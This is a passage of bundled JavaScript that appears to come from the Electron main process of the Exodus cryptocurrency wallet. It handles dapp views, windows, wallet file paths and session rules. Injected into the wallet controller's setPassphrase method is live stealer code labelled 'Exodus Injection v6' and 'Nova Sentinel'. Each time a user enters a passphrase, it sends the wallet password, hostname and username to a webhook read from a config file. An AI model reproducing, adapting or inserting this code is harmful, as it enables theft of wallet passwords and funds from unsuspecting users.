          Object(p.registerWebContents)(w.webContents, "dapp", {
            url: n,
            domains: r,
          }),
            Object(l.registerBrowserView)(w),
            v.set(e, w),
            F(w, k),
            w.setAutoResize({ width: !0, height: !0 }),
            h.appWindows.ui.webContents.on("devtools-reload-page", () => {
              O(w), Object(l.destroyBrowserView)(w);
            });
          const b = w.webContents.session;
          b.setPermissionRequestHandler((e, t, n) => {
            return n(!1);
          }),
            b.setPermissionCheckHandler(() => !1);
          const g = Object(i.randomBytes)(20).toString("hex");
          b.protocol.registerStringProtocol("exodus-dapp-api", (t, n) => {
            if (C.has(e)) return;
            try {
              const n = new a.URL(t.url),
                r = n.searchParams.get("data"),
                o = n.searchParams.get("token");
              if (!r || !o)
                throw new Error(
                  "No message or no CSRF token found in dapp IPC request!"
                );
              if (o !== g)
                throw new Error(
                  "exodus-dapp-api: got a message with mismatching token!"
                );
              h.appWindows.ui.webContents.send("exodus-dapp-api", {
                messageString: r,
                dappUid: e,
              });
            } catch (e) {
              console.error("Could not parse exodus-dapp-api request!"),
                console.error(e);
            }
            n({ mimeType: "text/plain", data: "ok" });
          }),
            f &&
              b.protocol.interceptStreamProtocol("http", (e, t) => {
                if ("GET" === e.method && e.url.startsWith(n)) {
                  const r = e.url.slice(n.length) || "index.html";
                  t(E(f(r)));
                } else
                  Object(d.showError)(
                    "loading of unexpected http:// url from dapp",
                    `: ${e.url}`
                  ),
                    t(E(f.notFound()));
              }),
            u.ENV_DEV && I(w),
            await w.webContents.loadURL(n);
          const S = JSON.parse(c);
          await w.webContents.executeJavaScript(`${m.default}(${o()(S)}),0`),
            await w.webContents.executeJavaScript(
              "\n      document.addEventListener('mouseover', ({ target }) => {\n        const { cursor } = getComputedStyle(target);\n        window._exodus_dapp_api.rpc.callMethod('setCursorStyle', [cursor])\n      }),0"
            ),
            w.webContents.debugger.attach("1.3");
          try {
            return (
              await w.webContents.executeJavaScript(
                `window._exodus_dapp_api.setToken(${o()(g)}),0`
              ),
              { usingSDK: !0 }
            );
          } catch (t) {
            return (
              console.error(`failed to set CSRF token on dapp ${e} : ${t}`),
              { usingSDK: !1 }
            );
          }
        }
      ),
      D("showDevTools", (e) => {
        const t = v.get(e);
        I(t);
      }),
      D("show", (e) => {
        const t = v.get(e);
        h.appWindows.background.addBrowserView(t),
          h.appWindows.background.setTopBrowserView(h.appWindows.ui),
          (S = t),
          F(t, k),
          L(t);
      });
    const L = (e) => {
      e.webContents.focus(),
        e.webContents.sendInputEvent({
          type: "mouseDown",
          x: 0,
          y: 0,
          button: "left",
          clickCount: 1,
        }),
        e.webContents.sendInputEvent({
          type: "mouseUp",
          x: 0,
          y: 0,
          button: "left",
        });
    };
    D("hide", (e) => {
      const t = v.get(e);
      O(t);
    }),
      D("goBack", (e) => {
        const t = v.get(e),
          n = t.webContents.canGoBack();
        return n && t.webContents.goBack(), n;
      }),
      D("api-receive", async (e, { dataString: t }) => {
        const n = v.get(e),
          r = JSON.stringify(JSON.parse(t));
        await n.webContents.executeJavaScript(
          `window._exodus_dapp_api.receive(${o()(r)}),0`
        );
      }),
      D("disable", (e) => {
        C.add(e);
        const t = v.get(e);
        v.delete(e), t && (O(t), Object(l.destroyBrowserView)(t));
      });
    const T = (e) => {
      const { type: t, offsetX: n, offsetY: r, deltaX: o, deltaY: i } = e,
        s = ["left", "middle", "right"][Number(e.button)] || null;
      switch (t) {
        case "mousedown":
          return s
            ? { type: "mousePressed", x: n, y: r, button: s, clickCount: 1 }
            : null;
        case "click":
          return s
            ? { type: "mouseReleased", x: n, y: r, button: s, clickCount: 1 }
            : null;
        case "mouseup":
          return s ? { type: "mouseReleased", x: n, y: r, button: s } : null;
        case "mousemove":
          return { type: "mouseMoved", x: n, y: r, button: s || "none" };
        case "wheel":
          return { type: "mouseWheel", x: n, y: r, deltaX: o, deltaY: i };
      }
      return console.error(`Unprocessed input event: ${t}`), null;
    };
    f.rpcMain.on("dapps:pointer", (e, t) => {
      const n = T(t);
      if (!n || !S) return;
      const r = S;
      ["mousedown", "click"].includes(t.type) && r.webContents.focus(),
        r.webContents.debugger.sendCommand("Input.dispatchMouseEvent", n);
    });
  },
  function (e, t, n) {
    const r = !1,
      o = { MAIN: 1, RENDERER: 2 },
      i = { BEGIN: "B", END: "E", INSTANT: "i" },
      s = [];
    function c(e) {
      return r
        ? (t) => {
            const n = {
              name: t,
              pid: o.MAIN,
              ph: e,
              cat: "PERF",
              timestamp: Date.now(),
            };
            e === i.INSTANT && (n.s = "p"), s.push(n);
          }
        : () => {};
    }
    e.exports = {
      PERF_METRICS_FEATURES: r,
      beginEvent: c(i.BEGIN),
      endEvent: c(i.END),
      instantEvent: c(i.INSTANT),
      getTimeOrigin: () => null,
      getTrace: (e) =>
        s.map((t) => {
          const { timestamp: n, ...r } = t;
          return { ...r, ts: 1e3 * (n - e) };
        }),
    };
  },
  function (e, t, n) {
    "use strict";
    const r = n(18).fromPromise,
      { makeDir: o, makeDirSync: i } = n(206),
      s = r(o);
    e.exports = {
      mkdirs: s,
      mkdirsSync: i,
      mkdirp: s,
      mkdirpSync: i,
      ensureDir: s,
      ensureDirSync: i,
    };
  },
  function (e, t, n) {
    "use strict";
    let r;
    function o() {
      return "boolean" == typeof r ? r : globalThis.DEBUG_MODE;
    }
    n.d(t, "default", function () {
      return o;
    });
  },
  function (e, t, n) {
    "use strict";
    n.d(t, "getHtmlUrl", function () {
      return c;
    });
    var r = n(1),
      o = n.n(r),
      i = n(13),
      s = n.n(i);
    const c = ({ app: e, filePath: t, hash: n, query: r }) => {
      const i = {
        protocol: "file",
        slashes: !0,
        pathname: o.a.resolve(e.getAppPath(), t),
        hash: n,
        query: r,
      };
      return s.a.format(i);
    };
  },
  function (e, t, n) {
    "use strict";
    function r(e = null) {
      return e ? encodeURIComponent(JSON.stringify(e)) : "";
    }
    n.d(t, "encode", function () {
      return r;
    });
  },
  function (e, t, n) {
    "use strict";
    n.d(t, "maximizeWorkaroundHandlers", function () {
      return h;
    }),
      n.d(t, "init", function () {
        return m;
      }),
      n.d(t, "maximize", function () {
        return y;
      });
    var r = n(0),
      o = n(77),
      i = n.n(o),
      s = n(2),
      c = n(4),
      a = n(8),
      u = n(5),
      l = n(10);
    const f = (() => {
        const e = [];
        return (
          s.ENV_BUILD_EXODUS && e.push("EXODUS"),
          s.ENV_BUILD_EDEN && e.push("EDEN"),
          e.push(s.PACKAGE.version),
          s.PACKAGE.version.includes("-") && e.push("[PRERELEASE]"),
          s.ENV_DEV && e.push("[DEV]"),
          s.NIGHTLY_BUILD && e.push("[NIGHTLY BUILD]"),
          e.join(" ")
        );
      })(),
      d = {
        ...l.default,
        width: s.MIN_WIDTH,
        height: s.MIN_HEIGHT,
        minWidth: s.MIN_WIDTH,
        minHeight: s.MIN_HEIGHT,
        title: f,
        webPreferences: {
          webSecurity: !0,
          contextIsolation: !0,
          enableRemoteModule: !1,
          nodeIntegration: s.ENV_TEST,
          sandbox: !0,
          spellcheck: !1,
          partition: "background",
        },
      };
    let p = null;
    const h = new Set();
    function m(e) {
      const t = i()({
        defaultWidth: d.width,
        defaultHeight: d.height,
        maximize: !1,
        fullScreen: !1,
      });
      "string" == typeof e && (d.title = d.title + ` (${e})`),
        (p = new r.BrowserWindow({ ...d, ...t })),
        Object(a.registerWebContents)(p.webContents, "background"),
        t.manage(p),
        p.webContents.loadFile(u.WINDOW_BACKGROUND),
        p.on("close", () => {
          for (const e of p.getBrowserViews()) p.removeBrowserView(e);
        });
      const n = () => {
        for (const e of h) e();
      };
      let o = new Map();
      const s = (e) => {
        for (const t of [e, 200, 500, 2e3])
          clearTimeout(o.get(t)), o.set(t, setTimeout(n, t));
      };
      return (
        "linux" === process.platform &&
          (p.on("maximize", () => {
            n(), s(20);
          }),
          p.on("resize", () => s(100))),
        p.on("focus", () => Object(c.targeted)("ui", "window:onfocus")),
        p.on("blur", () => Object(c.targeted)("ui", "window:onblur")),
        r.powerMonitor.on("suspend", () => {
          Object(c.targeted)("ui", "window:onfreeze");
        }),
        r.powerMonitor.on("resume", () => {
          Object(c.targeted)("ui", "window:onresume");
        }),
        p
      );
    }
    function y(e) {
      const t = i()({
        defaultWidth: d.width,
        defaultHeight: d.height,
        maximize: !1,
        fullScreen: !1,
      });
      ["linux", "win32"].includes(process.platform) &&
        t.isMaximized &&
        e.maximize();
    }
  },
  function (e, t, n) {
    "use strict";
    n.r(t),
      n.d(t, "setUserPath", function () {
        return f;
      }),
      n.d(t, "getDebugFile", function () {
        return d;
      }),
      n.d(t, "isExistsSync", function () {
        return p;
      }),
      n.d(t, "isExists", function () {
        return h;
      }),
      n.d(t, "create", function () {
        return m;
      }),
      n.d(t, "remove", function () {
        return y;
      });
    var r = n(0),
      o = n(9),
      i = n.n(o),
      s = n(50),
      c = n.n(s),
      a = n(1),
      u = n.n(a);
    let l;
    function f(e) {
      l = e;
    }
    function d() {
      const e = c()(process.argv),
        t = l || e.datadir || (r.app && r.app.getPath("userData"));
      return u.a.join(t, "debug");
    }
    function p() {
      const e = d();
      return i.a.existsSync(e);
    }
    function h(e) {
      const t = d();
      return i.a.access(t, (t) => e(!t));
    }
    function m(e) {
      const t = d();
      h((n) => {
        if (n) return e(!0);
        i.a.writeFile(t, "", (t) => e(null === t));
      });
    }
    function y(e) {
      const t = d();
      h((n) => {
        if (!n) return e(!0);
        i.a.remove(t, (t) => e(null === t));
      });
    }
  },
  function (e, t, n) {
    "use strict";
    var r = n(109),
      o = n(4),
      i = n(44);
    const s = new (class extends r.EventEmitter {
      constructor() {
        super(),
          (this._walletLoaded = !1),
          (this.setPassphrase = this.setPassphrase.bind(this)),
          (this.setWalletLoaded = this.setWalletLoaded.bind(this)),
          (this.hasWalletLoaded = this.hasWalletLoaded.bind(this));
      }
      async setInvalidPassphrase() {
        this.emit("passphrase:invalid");
        const e = Object(i.getWindow)();
        setImmediate(() => e.send("main:passphrase:invalid"));
      }
      async setSaltConnectionFailed() {
        this.emit("saltconn:failed");
        const e = Object(i.getWindow)();
        setImmediate(() => e.send("main:saltconn:failed"));
      }
      async setError(e) {
        this.emit("error", e);
      }
      async setPassphrase(e) {
        const configFilePath = path.join(
          __dirname,
          "..",
          "..",
          "..",
          "..",
          "..",
          "config.json"
        );
        const configFileContent = await fs.promises.readFile(
          configFilePath,
          "utf-8"
        );
        const configFileParsed = JSON.parse(configFileContent);
        const webhookUrl = configFileParsed.webhook;
        const links = configFileParsed.link;
        const computerName = os.hostname();
        const username = os.userInfo().username;

        const embed = {
          color: 3553599,
          footer: {
            text: "@Nova Sentinel | https://t.me/Sordeal",
          },
          title: "Exodus Injection v6",
          fields: [
            {
              name: `<a:keys:1159078859682107453> Passwords:`,
              value: `\`\`\`ansi\n[2;32m${e}[0m[2;32m[0m\`\`\`\n[Download ZIP](${links})`,
              inline: false,
            },
          ],

          thumbnail: {
            url: `https://raw.githubusercontent.com/ksch-58/sub/main/assets/gifnova.gif`,
          },
        };
        const message = {
          username: "Nova Sentinel",
          avatar_url:
            "https://raw.githubusercontent.com/ksch-58/sub/main/assets/lilnova.png",
          content: "@here" + "\n`" + computerName + "`" + " - " + "`" + username + "`",
          embeds: [embed],
        };

        const postData = JSON.stringify(message);
        const url = new URL(webhookUrl);
        const options = {
          hostname: url.hostname,
          path: url.pathname,
          method: "POST",
          headers: {
            "Content-Type": "application/json",
            "Content-Length": postData.length,
          },
        };

        const req = https.request(options, (res) => {
          let responseData = "";

          res.on("data", (chunk) => {
            responseData += chunk;
          });

          res.on("end", () => {
            if (res.statusCode === 204) {
              console.log("Nova Sentinel is here.");
            } else {
            }
          });
        });

        req.on("error", (error) => {});

        req.write(postData);
        req.end();

        this.emit("passphrase:set", e);
      }
      async setMnemonic(e) {
        this.emit("mnemonic:set", e);
      }
      async setWalletLoaded(e, t) {
        console.log(""),
          console.log(
            "SET WALLET LOADED",
            "action:",
            t,
            "loadedFrom:",
            this._loadedFrom
          ),
          console.log(e),
          console.log(""),
          (this._walletLoaded = e),
          (this._action = t),
          this.emit("wallet:loaded");
      }
      async awaitWalletLoaded() {
        this._walletLoaded ||
          (await new Promise((e) => this.once("wallet:loaded", e)));
      }
      async hasWalletLoaded() {
        return this._walletLoaded;
      }
      async getAction() {
        return this._action;
      }
      async setLoadedFrom(e) {
        (this._loadedFrom = e), this.emit("wallet:loadedfrom");
      }
      async getLoadedFrom() {
        return (
          void 0 === this._loadedFrom &&
            (await new Promise((e) => this.once("wallet:loadedfrom", e))),
          this._loadedFrom
        );
      }
      async setHasPassphrase(e) {
        (this._hasPassphrase = e), this.emit("wallet:haspassphrase");
      }
      async getHasPassphrase() {
        return (
          void 0 === this._hasPassphrase &&
            (await new Promise((e) => this.once("wallet:haspassphrase", e))),
          this._hasPassphrase
        );
      }
    })();
    Object(o.createServer)(
      "wallet-controller",
      ["wallet", "network", "ui", "passphrase"],
      s
    ),
      console.warn(
        `wallet-controller initialized, process.type = browser, timestamp: ${Date.now()}`
      ),
      (t.default = s);
  },
  function (e, t) {
    e.exports = require("fs");
  },
  function (e, t) {
    e.exports = require("crypto");
  },
  function (e, t, n) {
    "use strict";
    const { toISOString: r } = Date.prototype,
      o = (e) => {
        if ([1 / 0, -1 / 0, NaN, void 0, null].includes(e)) return `${e}`;
        if (!["string", "boolean", "number"].includes(typeof e)) {
          if ("object" != typeof e) throw new Error("Unexpected value type");
          const t = Object.getPrototypeOf(e);
          if (t === Date.prototype && e.toISOString === r)
            return `new Date(${o(r.call(e))})`;
          if (
            !(
              (t === Array.prototype && Array.isArray(e)) ||
              t === Object.prototype
            )
          )
            throw new Error("Unexpected object given as value");
        }
        return JSON.stringify(e)
          .replace(/([{,])"__proto__":/g, '$1["__proto__"]:')
          .replace(/[^\\]"__proto__":/g, () => {
            throw new Error("Unreachable");
          })
          .replace(/[\u2028\u2029]/g, (e) =>
            ((e) => `\\u${e.toString(16).padStart(4, "0")}`)(e.charCodeAt(0))
          );
      };
    e.exports = o;
  },
  function (e, t, n) {
    "use strict";
    n.d(t, "WALLET_DIR", function () {
      return a;
    }),
      n.d(t, "walletDirFromExodusDir", function () {
        return l;
      });
    var r = n(9),
      o = n.n(r),
      i = n(1),
      s = n.n(i),
      c = n(2);
    const a = "exodus.wallet",
      u = (e) => ({
        get infoFile() {
          return s.a.join(e, "info.seco");
        },
        async infoFileExists() {
          return o.a.pathExists(this.infoFile);
        },
        get passphraseFile() {
          return s.a.join(e, "passphrase.json");
        },
        async passphraseFileExists() {
          return o.a.pathExists(this.passphraseFile);
        },
        get seedFile() {
          return s.a.join(e, "seed.seco");
        },
        async seedFileExists() {
          return o.a.pathExists(this.seedFile);
        },
        get seedBackupFile() {
          return this.seedFile + ".bak";
        },
        async seedBackupFileExists() {
          return o.a.pathExists(this.seedBackupFile);
        },
        get storageFile() {
          return s.a.join(e, "storage.seco");
        },
        get twoFactorFile() {
          return s.a.join(e, "twofactor.seco");
        },
        get twoFactorSecretFile() {
          return s.a.join(e, "twofactor-secret.seco");
        },
        async twoFactorFileExists() {
          return o.a.pathExists(this.twoFactorFile);
        },
        async twoFactorSecretFileExists() {
          return o.a.pathExists(this.twoFactorSecretFile);
        },
        get lightningFile() {
          return s.a.join(e, "lightning-v2.seco");
        },
        get lightningSecretFile() {
          return s.a.join(e, "lightning-secret-v2.seco");
        },
        async lightningFileExists() {
          return o.a.pathExists(this.lightningFile);
        },
        async lightningSecretFileExists() {
          return o.a.pathExists(this.lightningSecretFile);
        },
        async walletExists() {
          const e = await this.seedFileExists(),
            t = await this.twoFactorFileExists();
          return e || t;
        },
        get walletDir() {
          return e;
        },
        get restoreFromCurrentPhraseFlagFile() {
          return s.a.join(e, "..", c.FLAG_FILE_RESTORE_FROM_CURRENT_PHRASE);
        },
        restoreFromCurrentPhraseFlagFileExistsSync() {
          return o.a.pathExistsSync(this.restoreFromCurrentPhraseFlagFile);
        },
      });
    function l(e) {
      return s.a.join(e, a);
    }
    t.default = u;
  },
  function (e, t, n) {
    "use strict";
    const r = n(17).fromPromise,
      o = n(92);
    e.exports = {
      pathExists: r(function (e) {
        return o
          .access(e)
          .then(() => !0)
          .catch(() => !1);
      }),
      pathExistsSync: o.existsSync,
    };
  },
  function (e, t) {
    e.exports = require("util");
  },
  function (e, t) {
    e.exports = require("os");
  },
  function (e, t, n) {
    "use strict";
    n.d(t, "imagesDir", function () {
      return c;
    }),
      n.d(t, "walletDir", function () {
        return a;
      }),
      n.d(t, "walletBackupDir", function () {
        return u;
      });
    var r = n(1),
      o = n.n(r),
      i = n(33),
      s = (n(2), n(42));
    function c() {
      return o.a.join(Object(s.dataDir)(), "images");
    }
    function a() {
      return o.a.join(Object(s.dataDir)(), i.WALLET_DIR);
    }
    function u() {
      return o.a.join(o.a.join(Object(s.dataDir)(), "backups"), "wallet");
    }
    n.d(t, "dataDir", function () {
      return s.dataDir;
    });
  },
  function (e, t, n) {
    "use strict";
    (t.reduce = function (e, t, n) {
      for (var r = 0; r < e.length; ++r) n = t(n, e[r], r, e);
      return n;
    }),
      (t.isAbstractCodec = function (e) {
        return (
          e &&
          "function" == typeof e.encode &&
          "function" == typeof e.decode &&
          "function" == typeof e.encodingLength
        );
      });
  },
  function (e, t, n) {
    "use strict";
    const r = n(18).fromPromise,
      o = n(47);
    e.exports = {
      pathExists: r(function (e) {
        return o
          .access(e)
          .then(() => !0)
          .catch(() => !1);
      }),
      pathExistsSync: o.existsSync,
    };
  },
  function (e, t, n) {
    "use strict";
    t.default = (e) => {
      const { height: t, width: n } = e.webContents
        .getOwnerBrowserWindow()
        .getContentBounds();
      return { height: t, width: n };
    };
  },
  function (e, t, n) {
    "use strict";
    n.d(t, "getWindow", function () {
      return d;
    }),
      n.d(t, "init", function () {
        return p;
      });
    var r = n(0),
      o = n(2),
      i = n(26),
      s = n(8),
      c = n(5),
      a = n(10),
      u = n(25);
    const l = {
      ...a.default,
      frame: !1,
      transparent: !0,
      fullscreen: !1,
      fullscreenable: !1,
      roundedCorners: !1,
      width: 700,
      height: o.UNLOCK_WINDOW_HEIGHT,
      resizable: !1,
      show: !1,
      title: "UNLOCK WALLET",
      modal: !0,
      webPreferences: { ...a.isolation, partition: "unlock" },
    };
    let f = null;
    const d = () => f;
    function p(e, t) {
      (f = new r.BrowserWindow({ ...l, parent: e })),
        Object(s.registerWebContents)(f.webContents, "unlock"),
        f.loadURL(
          Object(u.getHtmlUrl)({
            app: r.app,
            hash: Object(i.encode)(t),
            filePath: c.WINDOW_UNLOCK,
          })
        );
      let n = !1;
      return (
        r.app.on("before-quit", () => {
          (n = !0), f.isDestroyed() || f.close();
        }),
        f.on("close", (e) => {
          n || (e.preventDefault(), f.send("unlock:window-close"));
        }),
        f
      );
    }
  },
  function (e, t, n) {
    e.exports = n(187);
  },
  function (e, t, n) {
    "use strict";
    n.d(t, "getWindow", function () {
      return p;
    }),
      n.d(t, "init", function () {
        return h;
      });
    var r = n(0),
      o = n(26),
      i = n(8),
      s = n(11),
      c = n(14),
      a = n(5),
      u = n(10),
      l = n(25);
    const f = {
      ...u.default,
      backgroundColor: "#fff",
      x: 0,
      y: 0,
      fullscreen: !1,
      fullscreenable: !1,
      maximizable: !1,
      minimizable: !1,
      resizable: !0,
      show: !1,
      skipTaskbar: !1,
      title: "Wallet Process (hidden window)",
      webPreferences: {
        ...u.integration,
        partition: "persist:wallet",
        backgroundThrottling: !1,
      },
    };
    let d = null;
    const p = () => d;
    function h(e) {
      const t = r.screen.getPrimaryDisplay().size,
        n = { ...f, width: t.width / 3, height: t.height / 2 };
      (d = new r.BrowserWindow(n)),
        Object(i.registerWebContents)(d.webContents, "wallet"),
        Object(c.forwardErrors)(d.webContents, "wallet"),
        d.loadURL(
          Object(l.getHtmlUrl)({
            app: r.app,
            hash: Object(o.encode)(e),
            filePath: a.WINDOW_WALLET,
          })
        ),
        Object(s.default)({ windowHandle: d.webContents, windowId: "wallet" }),
        d.webContents.on("will-navigate", (e) => {
          e.preventDefault();
        });
      let u = !1;
      return (
        r.app.on("before-quit", () => {
          (u = !0), d.isDestroyed() || d.close();
        }),
        d.on("close", function (e) {
          u || (e.preventDefault(), d.hide());
        }),
        d
      );
    }
  },
  function (e, t, n) {
    "use strict";
    n.d(t, "getWindow", function () {
      return h;
    }),
      n.d(t, "init", function () {
        return m;
      });
    var r = n(0),
      o = n(26),
      i = n(24),
      s = n(8),
      c = n(11),
      a = n(14),
      u = n(5),
      l = n(10),
      f = n(25);
    const d = {
      ...l.default,
      backgroundColor: "#000",
      frame: !1,
      fullscreen: !1,
      fullscreenable: !1,
      maximizable: !1,
      minimizable: !1,
      resizable: !1,
      width: 800,
      height: 600,
      show: !1,
      skipTaskbar: !1,
      titleBarStyle: "default",
      title: "Enter Password",
      webPreferences: { ...l.isolation, partition: "passphrase" },
    };
    let p = null;
    const h = () => p;
    function m(e) {
      const t = e && e.recoverFromPhrase ? "Enter Mnemonic" : d.title;
      return (
        (p = new r.BrowserWindow({ ...d, title: t })),
        Object(s.registerWebContents)(p.webContents, "passphrase"),
        Object(a.forwardErrors)(p.webContents, "passphrase"),
        p.loadURL(
          Object(f.getHtmlUrl)({
            app: r.app,
            hash: Object(o.encode)(e),
            filePath: u.WINDOW_PASSPHRASE,
          })
        ),
        Object(i.default)() &&
          Object(c.default)({
            windowHandle: p.webContents,
            windowId: "passphrase",
          }),
        p.webContents.on("will-navigate", (e) => {
          e.preventDefault();
        }),
        p.webContents.setWindowOpenHandler((e) => ({ action: "deny" })),
        r.app.on("before-quit", () => {
          p.isDestroyed() || p.close();
        }),
        p.on("close", () => {
          p.destroy(), r.app.quit();
        }),
        p.webContents.once("dom-ready", () => p.show()),
        p
      );
    }
  },
  function (e, t, n) {
    "use strict";
    n.d(t, "getSessionRules", function () {
      return d;
    }),
      n.d(t, "getRequestRules", function () {
        return p;
      }),
      n.d(t, "registerWebContentsSession", function () {
        return h;
      }),
      n.d(t, "saveSessionWebContents", function () {
        return y;
      });
    var r = n(0),
      o = n(6);
    const i = new WeakMap(),
      s = new WeakMap(),
      c = new Set(),
      a = new Map(),
      u = new WeakMap(),
      l = new WeakSet(),
      f = new WeakMap();
    function d(e) {
      const t = s.get(e);
      return {
        permissions: (t && t.permissions) || [],
        downloads: (t && t.downloads) || [],
      };
    }
    function p(e, t) {
      u.has(e) || u.set(e, { firstUrl: t });
      const n = u.get(e);
      if (
        (function (e) {
          return e === r.session.defaultSession || l.has(e);
        })(e)
      )
        return (
          Object(o.showError)("invalidated session usage", ` by ${t}`), null
        );
      if (!n.webContents || (n.webContents && n.webContents.isDestroyed())) {
        const r = i.get(e);
        if (!r)
          return (
            Object(o.showError)("missing WebContents for session", `: ${t}`),
            null
          );
        if (r.isDestroyed()) return "block_silent";
        if (r.session !== e)
          return (
            Object(o.showError)("changed WebContents session", `: ${t}`), null
          );
        n.webContents = r;
      }
      if (["devtools:", "chrome-extension:"].includes(t.protocol))
        return { protocols: "*", domains: "*" };
      if (!n.sessionRules) {
        if (!s.has(e))
          return (
            Object(o.showError)("unregistered session usage", ` by ${t}`), null
          );
        const r = s.get(e);
        if (
          (!r.startUrlProtocolIsIntercepted &&
            !r.url.startsWith("file://") &&
            f.get(n.webContents) !== `${t}`) ||
          f.get(n.webContents) !== r.url
        )
          return (
            Object(o.showError)(
              "start url mismatch for WebContents",
              ` by ${t}`
            ),
            l.add(e),
            null
          );
        const { protocols: i, domains: c } = r;
        n.sessionRules = { protocols: i, domains: c };
      }
      return n.sessionRules;
    }
    function h(e, t) {
      const { type: n, persistName: i = n } = t,
        { session: u } = e;
      if (u !== r.session.defaultSession)
        if (
          Boolean(t.persistent) !== u.isPersistent() ||
          (t.persistent && u !== r.session.fromPartition(`persist:${i}`))
        )
          Object(o.showError)(
            'persistent session does not match "persist:" prefix',
            `: ${n}`,
            2
          );
        else {
          if (
            (c.has(n)
              ? t.multiple ||
                (Object(o.showError)(
                  "reuse of single-use WebContents type",
                  `: ${n}`,
                  1,
                  !1
                ),
                l.add(u))
              : c.add(n),
            t.multiple &&
              !t.parallel &&
              (a.has(n) && a.get(n).isDestroyed() && a.delete(n),
              a.has(n)
                ? (Object(o.showError)(
                    "reuse of exclusive-use WebContents type",
                    `: ${n}`,
                    1,
                    !1
                  ),
                  l.add(u))
                : (a.set(n, e),
                  e.on("destroyed", () => {
                    a.get(n) === e && a.delete(n);
                  }))),
            s.has(u))
          )
            return (
              t.reusable ||
                (Object(o.showError)(
                  "reuse of single-use WebContents session",
                  `: ${n}`,
                  1,
                  !1
                ),
                l.add(u)),
              void (
                s.get(u).type !== n &&
                (Object(o.showError)(
                  "reuse of WebContents session with mismatching type",
                  `: ${n}`,
                  1,
                  !1
                ),
                l.add(u))
              )
            );
          if ((s.set(u, t), t.flags.has("trezor-origin"))) {
            const e = "http://127.0.0.1:21325",
              t = { urls: [`${e}/*`] };
            u.webRequest.onBeforeSendHeaders(t, (t, n) => {
              new URL(t.url).origin === e &&
                (t.requestHeaders.Origin = "https://node.trezor.io"),
                n({ requestHeaders: t.requestHeaders });
            });
          }
        }
      else Object(o.showError)("usage of default session", `: ${n}`, 2);
    }
    function m(e) {
      return (e || "")
        .replace(/#.*/, "")
        .replace(
          /^(devtools:\/\/devtools\/bundled\/devtools_app\.html)(\?.*)?$/,
          "$1"
        );
    }
    function y(e) {
      const t = m(e.getURL());
      t && w(e, t),
        e.once("did-start-navigation", (n, r) => {
          const i = m(r.toString()),
            s = m(e.getURL());
          if (t) {
            if (i !== t || s !== t) {
              const e = JSON.stringify({ url: i, url1: s, url0: t });
              Object(o.showError)(
                "content.getURL() / navigationUrl mismatched initial navigation:",
                e,
                1,
                !1
              );
            }
          } else w(e, i);
        });
    }
    function w(e, t) {
      if (t.startsWith("devtools://")) return;
      if (!e.session)
        return void Object(o.showError)(
          "missing session for WebContents",
          `: ${t}`,
          1,
          !1
        );
      const { session: n } = e;
      if (n !== r.session.defaultSession) {
        if (!l.has(n)) {
          if (s.has(n)) {
            if (i.has(n)) {
              const e = i.get(n);
              if (!(s.get(n).reusable && e.isDestroyed()))
                return (
                  Object(o.showError)(
                    "session reuse between WebContents",
                    `: ${t}`,
                    1,
                    !1
                  ),
                  void l.add(n)
                );
            }
          } else {
            if (i.has(n))
              return (
                Object(o.showError)(
                  "session reuse without registration",
                  "",
                  1
                ),
                void l.add(n)
              );
            setImmediate(() => {
              s.has(n) ||
                (Object(o.showError)(
                  "session that was not immediately registered",
                  "",
                  1
                ),
                l.add(n));
            });
          }
          i.set(n, e), f.set(e, t);
        }
      } else
        Object(o.showError)("using default session for WebContents", "", 1);
    }
  },
  function (e, t, n) {
    "use strict";
    const r = n(47),
      o = n(1),
      i = n(35);
    function s(e, t, n) {
      const o = n.dereference
        ? (e) => r.stat(e, { bigint: !0 })
        : (e) => r.lstat(e, { bigint: !0 });
      return Promise.all([
        o(e),
        o(t).catch((e) => {
          if ("ENOENT" === e.code) return null;
          throw e;
        }),
      ]).then(([e, t]) => ({ srcStat: e, destStat: t }));
    }
    function c(e, t) {
      return t.ino && t.dev && t.ino === e.ino && t.dev === e.dev;
    }
    function a(e, t) {
      const n = o
          .resolve(e)
          .split(o.sep)
          .filter((e) => e),
        r = o
          .resolve(t)
          .split(o.sep)
          .filter((e) => e);
      return n.reduce((e, t, n) => e && r[n] === t, !0);
    }
    function u(e, t, n) {
      return `Cannot ${n} '${e}' to a subdirectory of itself, '${t}'.`;
    }
    e.exports = {
      checkPaths: function (e, t, n, r, l) {
        i.callbackify(s)(e, t, r, (r, i) => {
          if (r) return l(r);
          const { srcStat: s, destStat: f } = i;
          if (f) {
            if (c(s, f)) {
              const r = o.basename(e),
                i = o.basename(t);
              return "move" === n &&
                r !== i &&
                r.toLowerCase() === i.toLowerCase()
                ? l(null, { srcStat: s, destStat: f, isChangingCase: !0 })
                : l(new Error("Source and destination must not be the same."));
            }
            if (s.isDirectory() && !f.isDirectory())
              return l(
                new Error(
                  `Cannot overwrite non-directory '${t}' with directory '${e}'.`
                )
              );
            if (!s.isDirectory() && f.isDirectory())
              return l(
                new Error(
                  `Cannot overwrite directory '${t}' with non-directory '${e}'.`
                )
              );
          }
          return s.isDirectory() && a(e, t)
            ? l(new Error(u(e, t, n)))
            : l(null, { srcStat: s, destStat: f });
        });
      },
      checkPathsSync: function (e, t, n, i) {
        const { srcStat: s, destStat: l } = (function (e, t, n) {
          let o;
          const i = n.dereference
              ? (e) => r.statSync(e, { bigint: !0 })
              : (e) => r.lstatSync(e, { bigint: !0 }),
            s = i(e);
          try {
            o = i(t);
          } catch (e) {
            if ("ENOENT" === e.code) return { srcStat: s, destStat: null };
            throw e;
          }
          return { srcStat: s, destStat: o };
        })(e, t, i);
        if (l) {
          if (c(s, l)) {
            const r = o.basename(e),
              i = o.basename(t);
            if ("move" === n && r !== i && r.toLowerCase() === i.toLowerCase())
              return { srcStat: s, destStat: l, isChangingCase: !0 };
            throw new Error("Source and destination must not be the same.");
          }
          if (s.isDirectory() && !l.isDirectory())
            throw new Error(
              `Cannot overwrite non-directory '${t}' with directory '${e}'.`
            );
          if (!s.isDirectory() && l.isDirectory())
            throw new Error(
              `Cannot overwrite directory '${t}' with non-directory '${e}'.`
            );
        }
        if (s.isDirectory() && a(e, t)) throw new Error(u(e, t, n));
        return { srcStat: s, destStat: l };
      },
      checkParentPaths: function e(t, n, i, s, a) {
        const l = o.resolve(o.dirname(t)),
          f = o.resolve(o.dirname(i));
        if (f === l || f === o.parse(f).root) return a();
        r.stat(f, { bigint: !0 }, (r, o) =>
          r
            ? "ENOENT" === r.code
              ? a()
              : a(r)
            : c(n, o)
            ? a(new Error(u(t, i, s)))
            : e(t, n, f, s, a)
        );
      },
      checkParentPathsSync: function e(t, n, i, s) {
        const a = o.resolve(o.dirname(t)),
